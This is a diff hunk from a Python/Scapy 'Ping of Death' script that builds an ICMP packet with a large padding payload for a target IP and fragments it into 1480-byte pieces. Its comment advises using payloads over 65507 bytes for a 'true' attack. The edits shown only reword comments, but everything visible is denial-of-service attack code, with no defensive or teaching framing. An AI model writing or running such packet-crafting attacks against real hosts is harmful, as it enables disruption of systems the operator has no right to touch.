@@ -83,12 +83,12 @@ def main():
         print("[*] Note: payload fits in a normal datagram; "
               "use > 65507 for a true Ping of Death")
 
-    # Build the packet.  Scapy will handle IP identification automatically.
+    # Build the packet
     payload = Raw(load=b"X" * payload_size)
     pkt = IP(dst=target_ip) / ICMP() / payload
 
-    # Fragment manually so we can verify what goes on the wire.
-    # MTU of 1500 is standard; IP payload per fragment ≈ 1480 bytes.
+    # Fragment manually
+    # MTU of 1500 is standard; IP payload per fragment should equal 1480 bytes
     fragments = fragment(pkt, fragsize=1480)
 
     print(f"[*] Fragmented into {len(fragments)} fragments")
